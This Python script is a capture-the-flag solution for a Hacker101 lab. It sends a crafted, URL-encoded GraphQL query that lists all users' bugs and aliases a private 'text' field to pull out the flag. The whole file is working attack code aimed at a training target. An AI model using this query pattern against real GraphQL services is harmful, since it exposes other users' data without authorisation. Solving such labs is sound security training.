# Importing get function from requests module #
from requests import get as get_request
# Getting CTF ID fron User #
ctf_id = input("[1] Enter your ctf id: ")
# Handling Exceptions #
try:
    # Getting Flag fron CTF #
    response = get_request(f"https://{ctf_id}.ctf.hacker101.com/graphql?operationName=tumkullanicilar&query=query%20tumkullanicilar%7B%0A%20allUsers%7B%0A%20%20edges%20%7B%0A%20%20%20node%7B%0A%20%20%20%20bugs%7B%0A%20%20%20%20%20edges%7B%0A%20%20%20%20%20%20node%7B%0A%20%20%20%20%20%20%20id%3A%20text%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%7D%0A%20%20%7D%0A%20%7D%0A%7D")
    # If flag found successfully print flag, if not then show error #
    if response.status_code == 200:
        print(f"\033[32m[2] Your flag is: {response.text}\033[0m")
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[32m[2] {str(e)}\033[0m")